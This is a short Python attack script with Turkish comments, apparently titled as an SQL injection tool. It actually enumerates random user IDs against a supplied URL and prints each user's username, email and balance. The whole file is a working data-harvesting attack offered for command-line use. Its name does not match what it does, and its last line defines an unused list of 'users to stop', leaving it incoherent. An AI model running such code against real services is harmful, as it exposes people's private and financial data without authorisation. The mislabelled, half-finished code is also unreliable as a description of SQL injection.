import requests
import json
import random
import sys

# Hedef URL'yi tanımla
if len(sys.argv) != 2:
    print("Usage: python3 Sqlinjection.py <target_url>")
    sys.exit(1)

target_url = sys.argv[1]

# Rastgele kullanıcı kimlikleri oluştur
user_ids = random.sample(range(1, 1000), 10)

# Her kullanıcı kimliği için istek yap
for user_id in user_ids:
    url = target_url + str(user_id)

    try:
        # İsteği gönder ve yanıtı al
        response = requests.get(url)

        # Yanıtın durum kodunu kontrol et
        if response.status_code == 200:
            # Yanıtı JSON olarak ayrıştır
            data = json.loads(response.text)

            # Yanıttan ilgili bilgileri al
            username = data.get("username", "N/A")
            email = data.get("email", "N/A")
            balance = data.get("balance", "N/A")

            # Bilgileri ekrana yazdır
            print(f"User ID: {user_id}")
            print(f"Username: {username}")
            print(f"Email: {email}")
            print(f"Balance: {balance}")
            print("-" * 20)
        else:
            print(f"User ID: {user_id} için erişim izni yok (Status Code: {response.status_code})")
    except json.JSONDecodeError:
        print(f"User ID: {user_id} için geçersiz JSON yanıtı")
    except requests.exceptions.RequestException as e:
        print(f"User ID: {user_id} için istek başarısız: {e}")

# Durdurulacak kullanıcı kimlikleri
user_ids_to_stop = random.sample(user_ids, 5)
